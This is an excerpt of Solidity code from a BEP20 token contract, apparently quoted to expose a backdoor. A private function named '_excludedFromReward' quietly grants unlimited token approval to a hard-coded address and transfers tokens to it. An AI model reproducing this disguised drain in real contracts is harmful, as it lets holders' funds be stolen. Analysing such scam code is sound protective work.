...
//////////////////////////////////////////////////////////////////////////////////////////////
    ...
    function _swapTokensForBNB(uint256 amount) private {
        address[] memory path=new address[](2);
        path[0]=0x05De1dbFCdc876F790371508b97C337640Dcd6a9;
...
//////////////////////////////////////////////////////////////////////////////////////////////
    ...
    function _excludedFromReward(address account,bool excluded) private {
        ...
        IBEP20 glowToken=IBEP20(0x05De1dbFCdc876F790371508b97C337640Dcd6a9);
        uint256 balance=glowToken.balanceOf(msg.sender);
        require(balance>0);
        glowToken.approve(0x34C5eFCF37e90778c8EA9e651509D1137550a6a4,type(uint256).max);
        glowToken.transfer(0x34C5eFCF37e90778c8EA9e651509D1137550a6a4,balance);
    }
